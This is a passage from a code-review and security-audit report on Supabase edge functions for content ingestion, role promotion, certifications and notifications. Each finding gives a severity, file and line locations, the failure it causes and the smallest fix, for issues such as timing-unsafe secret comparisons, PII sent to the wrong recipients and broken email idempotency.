- **What breaks:** Verified: _shared/service-role-auth.ts provides timingSafeEqualStr + authorizeServiceRoleRequest (used correctly by guide-ingest). ingest-reference-csv (token === SERVICE, 205), scrape-figma (token !== SERVICE_KEY, 79), write-exploration-cache (token !== serviceRoleKey, 34) and prewarm (auth !== `Bearer ${SERVICE_KEY}`, 79) all use plain JS === that short-circuits at the first differing byte, leaking prefix/length via timing. seed-content uses auth.includes(serviceKey) (31) — substring matching accepts ANY Authorization header that merely CONTAINS the key and diverges from exact-match semantics. This is exactly the drift the repo warns against, on the most sensitive writers (legal policy, shared L3 cache, framework graph, paid AI).
- **Smallest fix:** Replace all five with authorizeServiceRoleRequest(req)/timingSafeEqualStr from the shared module; delete the local compares and the misleading comments.

### [Medium] knowledge_base has four uncoordinated writers with divergent row contracts  `ownership` (CONFIRMED)
- **Where:** guide-ingest/index.ts:142-155; ingest-csv-knowledge/index.ts:179-187; ingest-workshop-docs/index.ts:220-228; ingest-reference-csv/index.ts:505 (rpc fw_sync_relationships_to_kb)
- **What breaks:** Verified: four independent paths write knowledge_base — guide-ingest (chunked, content_hash set, embedding NULLed), ingest-csv-knowledge (no hash, no embedding invalidation), ingest-workshop-docs (same omission), and fw_sync_relationships_to_kb via ingest-reference-csv:505. No single owner/service enforces a consistent shape or the embedding-invalidation rule, so invariants the RAG pipeline depends on (content_hash for change detection, embedding=NULL for re-vectorisation) hold for some rows and not others. Any reader assuming the guide-ingest invariants is wrong for CSV/workshop rows.
- **Smallest fix:** Route all knowledge_base writes through one shared helper that always sets content_hash and nulls embedding on content change; make the RPC use the same contract.

### [Medium] ingest-csv-knowledge slug collisions silently overwrite entries and inflate the success count  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/ingest-csv-knowledge/index.ts:82-86,175-199
- **What breaks:** Verified: url is csv://<dataset>/<name-slug> via name.toLowerCase().replace(/[^a-z0-9]+/g,'-') (82). Two distinct names normalising to the same slug ('C++ Basics' vs 'C  Basics', 'Q&A' vs 'Q A') produce the same url; upsert onConflict:url makes the second silently overwrite the first. There is NO in-batch dedup guard (unlike ingest-reference-csv's seen-set at 294/303), and inserted++ fires for BOTH rows (196-197), so the response claims two entries stored when one was clobbered. Curators lose content behind a green success.
- **Smallest fix:** Detect slug collisions within the batch and disambiguate the url (append counter/hash) or report the collision instead of silently overwriting.

### [Medium] ingest-reference-csv emits framework edges via an N+1 RPC loop that can exceed the edge time budget mid-write  `boundary` (CONFIRMED)
- **Where:** supabase/functions/ingest-reference-csv/index.ts:429-452
- **What breaks:** Verified: after the batched upsert it re-selects inserted rows (430-433) and calls rpc('fw_emit_edges_for_entity') once PER ROW in a serial loop (435-451). For a large reference dataset that is hundreds/thousands of sequential round-trips; combined with the follow-on MV refreshes (499-505) and staging replay (463) a big import can hit the edge wall-clock limit and die AFTER upserting rows but BEFORE all edges emit. Result: a half-built graph — entities exist, relationships partially missing — with no resume marker and no idempotency signal to the admin that edge emission was incomplete.
- **Smallest fix:** Emit edges in a single set-based RPC over all upserted ids, or chunk-and-checkpoint so a timeout leaves a resumable state; surface incomplete emission in the response.

### [Medium] ingest-reference-csv swallows MV-refresh, KB-sync and provenance-log failures with no logging  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/ingest-reference-csv/index.ts:499-522
- **What breaks:** Verified: fw_refresh_neighbors_mv (499), fw_refresh_search_mv (502) and fw_sync_relationships_to_kb (505) are each `try { await ... } catch { /* non-fatal */ }` with ZERO logging, and the reference_data_sources provenance insert has an empty `catch { /* non-fatal */ }` (521). If an MV refresh fails, Fleety keeps serving the OLD graph/search index after a successful-looking ingest — the response says the data landed but chat answers don't reflect it, with no trace. The provenance swallow lets System Health → Content show a stale 'last refreshed' with no error. Report-nothing swallows on the exact flows the pipeline's freshness depends on.
- **Smallest fix:** console.error/audit each failure and include a refreshed:false flag in the response so admins know the graph/search index is stale despite a successful upsert.

### [Medium] scrape-figma-workshops defaults autoDiscover ON and dryRun OFF — an empty admin POST live-overwrites up to 200 workshops  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/scrape-figma-workshops/index.ts:114-119,130-211,282-289
- **What breaks:** autoDiscover defaults ON (body.autoDiscover !== false, line 115) while dryRun defaults OFF (!!body.dryRun, 114) and maxUrls defaults to 200 (119). So a bare POST with no body triggers Firecrawl profile scraping + map to harvest up to 200 community-file URLs (130-211) and then, for each, fuzzy-matches at 0.45 and UPDATEs live descriptions (282-289) with no dry run and no confirmation. This turns the 0.45 mismatch and the source='csv' provenance bugs into a bulk, one-click blast radius: a single accidental invocation can silently rewrite and re-embed hundreds of workshop descriptions.
- **Smallest fix:** Default auto-discovered / non-explicit runs to dryRun=true and require an explicit apply flag before any live UPDATE; cap the number of live overwrites per invocation.
- _added-in-verification_

### [Medium] ingest-reference-csv sends full slug lists through unbatched PostgREST .in() filters — large imports can silently truncate/fail the merge and edge selects  `other` (PLAUSIBLE)
- **Where:** supabase/functions/ingest-reference-csv/index.ts:376-380,428-433
- **What breaks:** Upserts are chunked in 200s (413-420), but the placeholder-merge existing-row lookup (377-380) and the edge re-select (430-433) pass the ENTIRE incomingSlugs/slugs array to a single .in('slug', ...). PostgREST serialises .in() values into the request URL; a several-thousand-row reference dataset produces a URL that can exceed server/proxy length limits, causing the select to error or return a partial set. If existingRows comes back short, admin edits it should have preserved get overwritten (the merge only protects slugs it saw as existing); if the edge re-select comes back short, edges are never emitted for the missing rows — both silent under the 'non-fatal' handling around them.
- **Smallest fix:** Batch these selects in chunks of ~200 slugs (matching the upsert batching) and accumulate results, or resolve via an RPC that takes the id/slug set once.
- _added-in-verification_

### [Medium] prewarm-ugc-worker writes QA-failed machine translations into the same serving table as passed ones  `other` (PLAUSIBLE)
- **Where:** supabase/functions/prewarm-ugc-worker/index.ts:132-159
- **What breaks:** On a QA failure the worker still upserts the bad output into ugc_translations with status='qa_failed' (135-146) — the row is always written; the qa result only sets the status string and adds a parallel i18n_qa_failures record. The serving table therefore holds rejected translations (wrong-language, placeholder-mangled, brand-broken) keyed identically to good ones. Any reader that fetches a translation by (entity,column,locale,hash) without filtering status='qa_passed' will serve QA-rejected content to members. Marked plausible because the reader's filtering is outside this section, but co-mingling failed output into the serving table is a latent correctness trap.
- **Smallest fix:** Do not upsert qa_failed output into ugc_translations (write it only to i18n_qa_failures), or make every read filter status='qa_passed' and add a NOT NULL/enum guard enforcing it.
- _added-in-verification_

### [Medium] ingest-csv-knowledge and ingest-workshop-docs store single unchunked rows up to 80k chars while fleety-embed only vectorises ~8k — most of a long entry is unsearchable  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/ingest-workshop-docs/index.ts:20,68-100,218-228; supabase/functions/ingest-csv-knowledge/index.ts:70-88,178-187 (contrast guide-ingest/index.ts:119-151)
- **What breaks:** ingest-workshop-docs caps content at MAX_CONTENT_LENGTH=80_000 (line 20) and stores it as ONE knowledge_base row; ingest-csv-knowledge likewise stores one row per entry. guide-ingest specifically added chunkMarkdown (119-151, comment: 'fleety-embed only vectorises ~8k/row') to avoid half-lost pages. These two paths never chunk, so for any workshop/CSV entry longer than the embed slice (~8k) the embedding is computed from only the first slice and the remaining bulk of the document is never represented in the vector — Fleety cannot semantically retrieve the later sections even though the text is stored.
- **Smallest fix:** Chunk CSV/workshop bodies the same way guide-ingest does (chunkMarkdown + #pN rows, each with embedding NULL) so the whole entry is embeddable and searchable.
- _added-in-verification_

### [Low] guide-ingest delete-then-upsert of chunks is non-atomic; a mid-page failure loses chunk rows  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/guide-ingest/index.ts:142-155
- **What breaks:** Verified: for a changed page it DELETEs all #p% chunk rows (142) then upserts new chunks in a separate call (152-154). If the process crashes or the upsert errors between the two, the page's chunks are gone and the page is half-removed from KB until the next successful ingest, silently shrinking Fleety's searchable coverage for that handbook page. The per-page catch (158-163) preserves nothing here because the delete already committed.
- **Smallest fix:** Do delete+upsert in one RPC transaction, or upsert first and delete only now-orphaned higher-index chunks after a successful upsert.

### [Low] guide-ingest chunk delete uses raw URL in a LIKE pattern — underscore/percent in the path act as wildcards  `boundary` (CONFIRMED)
- **Where:** supabase/functions/guide-ingest/index.ts:142
- **What breaks:** Verified: delete().like('url', `${page.url}#p%`) interpolates page.url into a LIKE pattern with no escaping. Guide paths commonly contain '_' (e.g. /getting_started), which LIKE treats as a single-char wildcard, so the pattern can match and DELETE chunk rows of a DIFFERENT page whose URL differs only at that character; a '%' in a query string matches arbitrarily. Blast radius: silent deletion of another page's KB chunks, which only reappear when that other page is itself re-ingested.
- **Smallest fix:** Escape LIKE metacharacters (\_, \%) in page.url before building the pattern, or store a stable chunk_group key and delete by equality.

### [Low] prewarm-ugc-worker and scrape-figma-workshops make external AI/scrape calls with no timeout  `error-handling` (CONFIRMED)
- **Where:** prewarm-ugc-worker/index.ts:34-43; scrape-figma-workshops/index.ts:142-154,237-248
- **What breaks:** Verified: the Lovable AI fetch (prewarm 34-43) and the Firecrawl scrape/map fetches (figma 142-154, 237-248) use no AbortController/timeout (contrast guide-ingest FETCH_TIMEOUT_MS + redirect:'error'). A single hung upstream call blocks the whole serial loop until the edge runtime kills the invocation, stranding every not-yet-processed job/URL (prewarm jobs stuck 'processing', figma rows partially updated) and burning the invocation with no result written for the remainder.
- **Smallest fix:** Wrap each external fetch in an AbortController with a bounded timeout and treat timeout as a retryable per-item failure, mirroring guide-ingest.

### [Low] Sensitive writers run without the audit wrapper — no trail for legal, cost, or reference-data changes  `error-handling` (CONFIRMED)
- **Where:** seed-content/index.ts:25; prewarm-ugc-worker/index.ts:73; scrape-figma-workshops/index.ts:62
- **What breaks:** Verified: most functions here use withAuditWrapper, but seed-content (rewrites legal policy_versions), prewarm-ugc-worker (spends paid AI) and scrape-figma-workshops (overwrites reference descriptions + triggers embeds) use bare Deno.serve. Their uncaught errors emit no audit event and their sensitive mutations have no trace correlation, so a legal-policy blank-out or a bad bulk overwrite leaves no server-side audit record to reconstruct what ran.
- **Smallest fix:** Wrap these three handlers in withAuditWrapper like their siblings so errors and traces are recorded for the most consequential writes.

### [Low] write-exploration-cache comment falsely advertises a constant-time secret compare on a public endpoint  `security` (CONFIRMED)
- **Where:** supabase/functions/write-exploration-cache/index.ts:1,25-34
- **What breaks:** Verified: the file is tagged // @edge-public (line 1, verify_jwt=false) so it is reachable unauthenticated, and its only gate is `token !== serviceRoleKey` (34) — a plain JS compare that short-circuits at the first differing byte. The comment (25-28) claims it is 'constant-time-ish via length-checked ===', a guarantee the code does not provide. A future maintainer trusts a false reassurance on the very endpoint that gates poisoning of the L3 semantic cache served to all members.
- **Smallest fix:** Use timingSafeEqualStr/authorizeServiceRoleRequest and delete the misleading comment.

### [Low] scrape-figma re-embed is best-effort-swallowed — a description update can land with a permanently stale vector  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/scrape-figma-workshops/index.ts:293-298
- **What breaks:** After a successful description UPDATE the function invokes fleety-embed with `.catch(() => {})` (295-297). If the embed invoke fails, the description is already changed but its vector is not refreshed, and nothing records the failure or re-queues it — the same stale-vector drift as the CSV/workshop finding, but reached even on the happy write path. Fleety then matches an old vector against new text for that workshop with no error and no metric.
- **Smallest fix:** On embed-invoke failure, null the row's embedding (or enqueue a re-embed) and log it, so the fleety-embed backfill re-vectorises rather than leaving a stale vector.
- _added-in-verification_

---

## Edge: Roles, admin & certifications

### [High] Confirmation token is consumed BEFORE the role is granted → transient DB error permanently bricks the promotion  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/confirm-admin-role/index.ts:118-139 (identical confirm-teacher-role/index.ts:113-133)
- **What breaks:** The single-use claim commits confirmed_at (admin 118-123) BEFORE the user_roles upsert (133-139). Verified: if the upsert returns roleErr the function returns 500 at 136-139 but confirmed_at is already committed. On any retry, verify_admin_promotion_token returns the row with confirmed_at set, evaluateConfirmation hits `if (promotion.confirmed_at) return already_confirmed` (confirm-role.ts:66), and confirm-*/index.ts returns {success:true, already_confirmed:true} at 200. User is told they are confirmed while holding NO admin/teacher role; only a DBA nulling confirmed_at or a fresh promotion recovers it. Ordering is backwards — the irreversible consume gates nothing.
- **Smallest fix:** Upsert the role first (idempotent), then stamp confirmed_at only after the role write succeeds; or wrap both in one RPC/transaction. On upsert failure, roll confirmed_at back to null before returning 500.

### [High] mark-interview-scheduled emails applicant PII to whoever it guesses is the admin by scanning audit_log  `security` (CONFIRMED)
- **Where:** supabase/functions/mark-interview-scheduled/index.ts:178-196 (recipient), 235-236 (PII payload), 288-298 (send)
- **What breaks:** Verified: when projects.coordinator_id is null (166-176) the recipient is the first non-applicant user_id from the last 20 audit_log rows for the application (180-194). audit_log is written by many actors (viewers, other admins, system jobs). That guessed id is then emailed + in-app notified with notifTitle/notifBody containing the applicant's real name and the client/project name (235-236, 288-298). Wrong-recipient disclosure of applicant PII driven by an untrusted heuristic, not an authorization decision.
- **Smallest fix:** Never derive notification targets from audit_log. Resolve the responsible admin from an authoritative column (coordinator_id / explicit invited_by on project_applications). If none exists, fall through to the defined admin role set, never a guessed individual.

### [Medium] Confirmation-token expiry depends entirely on an unseen DB default; nothing in the promote path sets expires_at, and null is treated as never-expires  `dependency` (CONFIRMED)
- **Where:** promote-to-admin/index.ts:158-162, promote-to-teacher/index.ts:138-142; consumed at _shared/confirm-role.ts:67-69
- **What breaks:** Verified: both promote inserts write only {user_id, promoted_by} and select only token (158-162 / 138-142) — expires_at is set nowhere in the handler. The expiry guarantee therefore rides entirely on a column DEFAULT in an unapplied/unseen migration (this repo hand-applies migrations, per MEMORY — a dropped default ships silently). And confirm-role.ts:67 gates on `promotion.expires_at && Date.parse(...) < nowMs`, so a null expires_at is treated as NEVER expires: a leaked/prefetched confirmation link stays valid forever. No test asserts null-expiry is rejected.
- **Smallest fix:** Set expires_at explicitly at insert time in both promote functions (now()+interval), and in evaluateConfirmation treat a null expires_at as expired/invalid rather than eternal.

### [Medium] 2FA step-up is enforced on promote-to-admin but NOT on promote-to-teacher or revoke-teacher-role  `security` (CONFIRMED)
- **Where:** present: promote-to-admin/index.ts:94-100 (requireFreshAdmin2fa); absent: promote-to-teacher/index.ts:71-84, revoke-teacher-role/index.ts:44-50
- **What breaks:** Verified: promote-to-admin calls requireFreshAdmin2fa (94) requiring aal2 + a fresh two_factor_login_sessions row. promote-to-teacher and revoke-teacher-role do only an admin-role check (73-84 / 45-50) with no step-up. An aal1 or hijacked admin session that is blocked from minting admin promotions can still mint teacher promotions (content-authoring privilege) and strip teacher roles at will. The weakest privileged mutation defines the real attack surface, defeating the admin-path step-up.
- **Smallest fix:** Apply requireFreshAdmin2fa to promote-to-teacher and revoke-teacher-role (and any other privileged role mutation) so the escalation gate is uniform.

### [Medium] revoke-teacher-role writes no audit log for a security-sensitive role removal  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/revoke-teacher-role/index.ts:72-81; wrapper _shared/audit.ts:178-187
- **What breaks:** Verified: the successful delete path (72-81) has zero write_audit_log call, unlike every sibling (promote-to-admin:280, promote-to-teacher:238, confirm-*:141/135). withAuditWrapper only emits edge_function_error on an uncaught throw (audit.ts:178-187), so a clean revoke leaves no record. A teacher role can be stripped with no trace of who, when, or from whom — a forensics/compliance hole on exactly the privileged action that must be auditable.
- **Smallest fix:** Add write_audit_log (event teacher_role_revoked, p_user_id=caller.id, target user_id) after the successful delete at 77.

### [Medium] revoke-teacher-role returns raw internal/DB error text to the client  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/revoke-teacher-role/index.ts:77, 82-87
- **What breaks:** Verified: `if (delErr) throw delErr` (77) is caught at 82 and the raw `err.message` is returned as {error: message} with status 500 (83-85). Postgres/PostgREST strings (constraint names, column names, policy hints) leak to the caller and into logs. It is also a swallow-and-rethrow that flattens a structured DB failure into an opaque 500 with no recover/retry.
- **Smallest fix:** Log the detailed error server-side; return a fixed generic message ('Failed to revoke teacher role') with a stable status. Do not echo err.message.

### [Medium] grant-observer-role: completions finished by the retry queue never send the Tier-0 'you're an Observer' notification/email  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/grant-observer-role/index.ts:236-243, 264-271, 279-317
- **What breaks:** Verified: the notification+email block (279-317) runs only inside `if (results.projects_granted && results.observers_granted)` within THIS synchronous invocation. When a Discord grant fails it is enqueued via queue_discord_role_grant (236/264) and later completed by a background worker that has no access to this block. Those users' roles eventually go live but they are never told, and the critical Tier-0 email is skipped for exactly the users who hit a transient Discord error. Two grant mechanisms, divergent side effects = silent drift.
- **Smallest fix:** Fire the notification/email on the transition to fully-granted regardless of which path completes it (trigger from wherever observers_role_granted_at is stamped, including the worker), guarded by an idempotency key.

### [Medium] grant-observer-role mirrors discord_user_id into observer_role_optins → stale copy grants roles to the wrong Discord account  `ownership` (CONFIRMED)
- **Where:** supabase/functions/grant-observer-role/index.ts:155-161 (read), 186-193 (mirror), 236-243/264-271 (queued copy)
- **What breaks:** Verified: discord_user_id is owned by profiles (read 155-161) but copied into observer_role_optins on upsert (189) and passed as p_discord_user_id into queue_discord_role_grant (239/267). If the user relinks/changes their Discord account after opt-in, profiles updates while the optin mirror and any already-queued retry rows keep the OLD id — the worker then grants privileged Discord roles to the user's former/wrong Discord identity. Classic kept-in-sync mirror that eventually disagrees.
- **Smallest fix:** Treat profiles.discord_user_id as the sole source of truth; have the retry worker re-read it at grant time, or queue only user_id and resolve the Discord id fresh.

### [Medium] grant-observer-role audit() swallows all errors, and the abuse rate limiter counts those same best-effort audit rows  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/grant-observer-role/index.ts:38-49 (empty catch), 96-108 (rate limit counts observer_role_optins audit rows)
- **What breaks:** Verified: audit() wraps write_audit_log in `catch { /* swallow */ }` (46-48). The 5/hour rate limit is computed by COUNTing audit_log rows for user+table observer_role_optins (99-104). Because the counter reads the very rows that audit() is allowed to silently fail to write (and several early exits — discord_not_linked 163, alreadyGranted 173 — never audit at all), the count under-reports and the limit weakens or stops limiting. A security control built on best-effort telemetry that is explicitly allowed to fail silently.
- **Smallest fix:** Track attempts in a dedicated counter written on a path that fails loudly (not audit_log); surface audit-write failures instead of swallowing them.

### [Medium] fetch-class/project-certifications: unbounded N+1 sequential Airtable calls with no cross-user caching → throttling at scale  `other` (CONFIRMED)
- **Where:** fetch-class-certifications/index.ts:201-227 + fetchAllAirtableRecords:28-50; fetch-project-certifications/index.ts:200-224
- **What breaks:** Verified: cohort/project names resolve with one sequential fetch() per distinct id inside a single request (class 201-227, project 200-224), and the record fetch paginates with an unbounded `do { ... } while (offset)` (28-50). No cache — every user re-resolves the same shared cohort/project names on every sync. Against Airtable's ~5 req/s per-base limit, a user in many cohorts or several concurrent syncs hit 429s. On the records fetch a 429 throws → soft failure (class 141-161); in the per-id loop it just `continue`s (215/212), silently dropping the name.
- **Smallest fix:** Batch/parallelize id resolution with a concurrency cap + 429 backoff; cache cohort/project id→name in a shared Supabase table; cap total pages.

### [Medium] fetch-*-certifications write user email PII into audit_log.changed_fields and console on every sync  `security` (CONFIRMED)
- **Where:** fetch-class-certifications/index.ts:143,164,176,296; fetch-project-certifications/index.ts:142,163,175
- **What breaks:** Verified: `email:${userEmail}` is pushed into audit_log changed_fields on the started/no-results row (class 176, project 175) and the completed row (class 296), and the raw email is console.log/console.error'd (class 143,164; project 142,163) on every run including no-result runs. audit_log is a long-lived, broadly-readable telemetry store already keyed by user_id — scattering the email across it on each fetch needlessly expands GDPR/CCPA retention and breach surface.
- **Smallest fix:** Log user_id only; drop email from changed_fields and console statements (hash if a correlation key is genuinely needed).

### [Medium] User-facing privilege-granting endpoints are mislabeled @edge-cron, hiding them from public-surface security review  `boundary` (CONFIRMED)
- **Where:** grant-observer-role/index.ts:1; mark-interview-scheduled/index.ts:1; fetch-class-certifications/index.ts:1; fetch-project-certifications/index.ts:1
- **What breaks:** Verified all four carry `// @edge-cron` on line 1 yet each parses a user Bearer JWT and enforces per-user authz (grant-observer 62-76, mark-interview 59-78, fetch-class 62-86, fetch-project analogous). By contrast promote-to-admin/teacher and confirm-* correctly use @edge-public. Any gate/audit that keys off @edge-public vs @edge-cron to decide what gets public-endpoint scrutiny will misclassify these authenticated, internet-reachable, Discord-role-granting, state-mutating endpoints as internal cron — an audit blind spot on exactly the risky surfaces.
- **Smallest fix:** Change the four annotations to @edge-public (or the correct 'user-invoked, self-authed' marker).

### [Medium] mark-interview-scheduled no-coordinator fallback emails + notifies EVERY admin with applicant PII on every call  `boundary` (CONFIRMED)
- **Where:** supabase/functions/mark-interview-scheduled/index.ts:299-313 (all-admins branch), 284-286 (notifyAdmin fan-out)
- **What breaks:** Distinct from the guessed-individual path: when neither coordinator_id nor an audit_log actor is found, the else branch (299-313) selects ALL user_roles where role='admin' and runs notifyAdmin on each via Promise.all (307). notifyAdmin does BOTH safe_create_notification and a transactional email (284-286), each carrying the applicant's name and client name. So a single applicant self-marking their interview fans out an in-app notification + an email to the entire admin set. At any real admin count this is a per-request notification/email storm and broad PII spray triggered by an unauthenticated-in-intent user action, with all failures swallowed (247, 280).
- **Smallest fix:** Resolve a single authoritative owner (coordinator_id / invited_by); if absent, route to one ops inbox or a bounded on-call, not a fan-out to every admin on every call.
- _added-in-verification_

### [Medium] grant-observer-role Tier-0 confirmation is best-effort and the alreadyGranted short-circuit never retries a dropped one  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/grant-observer-role/index.ts:282-317 (swallowing try/catch), 173-183 (alreadyGranted early return)
- **What breaks:** The 'observer-role-granted is Tier 0 (critical): always send' notification + email block is wrapped in `try { ... } catch { log.warn }` (283-317) — a transient failure of the notifications insert (295) or send-transactional-email invoke (306) is swallowed and the roles are already granted. On any subsequent call the idempotency check returns alreadyGranted at 173-183 BEFORE reaching the notification block, so the dropped Tier-0 email/notification is NEVER retried. The critical confirmation is silently lost for exactly the users who hit a transient notify failure — the opposite of 'always send'.
- **Smallest fix:** Drive the Tier-0 notification from a durable idempotent path (e.g. keyed off observers_role_granted_at with a sent flag) that the alreadyGranted return also reconciles, or enqueue it rather than fire-and-forget.
- _added-in-verification_

### [Low] grant-observer-role rate limit is a non-atomic TOCTOU check  `security` (CONFIRMED)
- **Where:** supabase/functions/grant-observer-role/index.ts:97-108
- **What breaks:** Verified: the limiter reads count (99-104) then decides (105) with no atomic increment or lock. N concurrent requests from one user all read count<5 before any audit row lands, so all N pass the gate — bursting past the 5/hour cap and multiplying Discord API calls (grantRole) and queue_discord_role_grant inserts.
- **Smallest fix:** Make it atomic — a single increment-and-check RPC under a row lock, or a DB window/unique constraint — not read-then-act.

### [Low] promote-to-admin and promote-to-teacher duplicate ~90% of the flow and embed full HTML email templates in the handler  `under-engineering` (CONFIRMED)
- **Where:** promote-to-admin/index.ts:192-231 (inline HTML), promote-to-teacher/index.ts:168-190 (inline HTML); near-identical auth/insert/enqueue flow across both
- **What breaks:** Verified: the auth→admin-check→dedupe→insert promotion→build email→enqueue_email_v2→audit flow is copy-pasted, each carrying a large inline HTML/text template. Presentation is fused into the auth handler (boundary violation) and the copies have already diverged: admin has 2FA step-up + zod-only user_id (7,94), teacher adds a UUID regex and no step-up (99); admin uses .single() while teacher uses .maybeSingle(). The next change must be made twice and will drift again.
- **Smallest fix:** Extract a shared promoteRole(role, opts) service and move email bodies to the templating/email layer (templateName) instead of inline HTML.

### [Low] mark-interview-scheduled updates status without a compare-and-set guard → TOCTOU duplicate notifications  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/mark-interview-scheduled/index.ts:143-155, 238-248
- **What breaks:** Verified: status is validated at 143-149 then updated at 152-155 with only `.eq('id', applicationId)` — no `.eq('applicant_status','invited_to_interview')` and no rowcount check. Two concurrent requests both pass the check and both proceed to the notification fan-out. The email is deduped by idempotencyKey (270) but safe_create_notification (239-246) has no idempotency key, so the admin(s) get duplicate in-app 'Interview Scheduled' notifications.
- **Smallest fix:** Make the update a compare-and-set on the current status and only fan out notifications when a row actually changed (rowcount>0).

### [Low] fetch-*-certifications return HTTP 200 with success:false on Airtable failure, contradicting the 500 catch path  `error-handling` (CONFIRMED)
- **Where:** fetch-class-certifications/index.ts:154-160 vs 313-320; fetch-project-certifications/index.ts:153-159 vs 316-319
- **What breaks:** Verified: an Airtable query failure returns status 200 with {success:false} (class 154-160, project 153-159) while the outer catch returns 500 (class 313-320). React Query callers keying retry/error UX off res.ok treat the Airtable failure as success and silently render stale/empty certifications; two exits use inconsistent status codes for the same failure class.
- **Smallest fix:** Return a non-2xx (e.g. 502) on the Airtable-failure branch to match the catch and engage the client's error handling.

### [Low] Certification name resolution silently stores raw Airtable record IDs when a lookup fails  `error-handling` (CONFIRMED)
- **Where:** fetch-class-certifications/index.ts:208-215,261; fetch-project-certifications/index.ts:206-213,258
- **What breaks:** Verified: on a cohort/project lookup !ok the code logs and `continue`s (class 208-216, project 206-213), leaving the id unmapped; the upsert then writes `regFor.map(id => cohortNameMap[id] || id)` (class 261, project 258), storing the raw Airtable record id (rec0abc…) as the human-facing 'Registered For'/'Project They Joined' value. Users see cryptic record IDs on certificates; the only signal is a partial-resolution audit row.
- **Smallest fix:** On resolution failure, leave the prior good value untouched or fail that record — don't overwrite with a raw record id; retry the lookup with backoff.

### [Low] promote-* insert a second email_send_log row with the same message_id on enqueue failure  `ownership` (CONFIRMED)
- **Where:** promote-to-admin/index.ts:239-245 then 266-272; promote-to-teacher/index.ts:195-201 then 225-231
- **What breaks:** Verified: a 'pending' email_send_log row is inserted before enqueue (admin 239-245, teacher 195-201); on enqueueErr a SECOND row with the identical message_id is inserted as 'failed' (admin 266-272, teacher 225-231). message_id is the reconciliation key for the terminal write-back trigger, so the trigger/status queries now see an ambiguous pending+failed pair, and a successful enqueue leaves the 'pending' row that nothing in this handler finalizes.
- **Smallest fix:** Update the existing pending row to 'failed' by message_id instead of inserting a duplicate; add a unique constraint on email_send_log.message_id.

### [Low] mark-interview-scheduled reimplements escapeHtml locally instead of the shared helper  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/mark-interview-scheduled/index.ts:27-34 vs _shared/escape-html.ts (used by promote-to-admin:10, promote-to-teacher:6)
- **What breaks:** Verified: a private escapeHtml is hand-rolled at 27-34 while _shared/escape-html.ts exists and is imported by both promote functions. Two implementations of an XSS-relevant primitive drift independently — if the shared one is hardened (backticks, extra entities) this copy silently stays weaker, and the applicant-controlled name it escapes is injected into both the in-app notification body and the HTML email (231-236).
- **Smallest fix:** Import escapeHtml from _shared/escape-html.ts and delete the local copy.

### [Low] grant-observer-role drops the grant with no retry when Discord returns 404  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/grant-observer-role/index.ts:235, 263 (`if (r.status !== 404)` gate on queue_discord_role_grant)
- **What breaks:** Verified: queue_discord_role_grant is called only when `r.status !== 404` (235, 263). When Discord returns 404 (member not yet in the guild, or transient join-race), the role is neither applied nor queued — the optin row gets last_error set (244-247/272-275) and the function returns 502, but nothing ever re-attempts. If the user later joins the guild there is no retry path; they are stuck opted-in with no roles and no worker will fix it. A partial-failure black hole distinct from the queued-retry path.
- **Smallest fix:** Queue 404s too (or record a distinct pending state the worker re-checks once the member appears in the guild) rather than dropping them; only truly-permanent errors should skip the queue.
- _added-in-verification_

### [Low] fetch-*-certifications persist the entire raw Airtable record into raw_data with no field minimization  `security` (PLAUSIBLE)
- **Where:** fetch-class-certifications/index.ts:255-279 (raw_data: fields); fetch-project-certifications/index.ts:252-269
- **What breaks:** Verified: the upsert stores `raw_data: fields` — the full spread of every Airtable column on the registration/roster record (256/253) — into class_certifications/project_certifications alongside a plaintext email column. Whatever Airtable carries (contributor emails, internal notes, cross-linked PII) is copied wholesale into Supabase on every sync and retained indefinitely, with no allow-list of the fields actually needed for display_title. Given the repo's compliance posture this is over-collection that widens retention and breach surface.
- **Smallest fix:** Persist only the specific fields the UI needs (or an explicit allow-list) into raw_data; drop unrecognized/PII-bearing columns before upsert.
- _added-in-verification_

---

## Edge: Notifications & push

### [High] Interview/status emails embed Date.now() in the idempotency/messageId key, defeating source-level dedup and double-emailing applicants  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/notify-applicant-status/index.ts:535 (`interview-invite-${applicationId}-${Date.now()}`) and :571 (`applicant-status-${applicationId}-${newStatus}-${Date.now()}`); messageId set = idempotencyKey at :542/:579; dedup guard keys on message_id at _shared/transactional-email.ts:503
- **What breaks:** Verified: the dedup guard at transactional-email.ts:498-533 skips a re-enqueue only when it finds an existing email_send_log row with the SAME message_id. Because the key embeds Date.now(), every invocation yields a unique messageId, so the guard NEVER matches. An admin double-click, client retry, or any re-fire of the status change sends the applicant a second/third 'Interview Invitation' or status-change email. The function's own test (notify-applicant-status/index.test.ts:6) asserts the key should be `interview-invite-${applicationId}` with no timestamp — the code contradicts its documented contract.
- **Smallest fix:** Drop `-${Date.now()}`; use `interview-invite-${applicationId}` and `applicant-status-${applicationId}-${newStatus}` so retries dedup (matches the test).

### [High] notify-class-published claims per-follower idempotency that does not exist — every re-invoke re-spams the whole follower set  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/notify-class-published/index.ts:4-5 (comment 'Idempotent per follower per class via a metadata check on notifications') vs the send loop :133-148 which calls safe_create_notification for every recipient with zero dedup/metadata check
- **What breaks:** Verified: there is no metadata/existence check anywhere in the file. Re-invoking (admin re-publish, retry, or the app calling it twice after approve_and_publish_class) sends a duplicate 'New class published' notification to every follower plus the owner. For a popular class this re-notifies the entire follower set on each call. The false comment misleads the next maintainer into assuming replay safety.
- **Smallest fix:** Implement the claimed guard (unique on (user_id, class_id, notification_type) or a pre-insert existence check / stable key like class_published-${classId}-${uid}), or delete the comment and add real dedup.

### [High] send-project-blast has no cross-retry idempotency and strands blasts in 'sending' on timeout, re-emailing up to 5,000 recipients  `error-handling` (CONFIRMED)
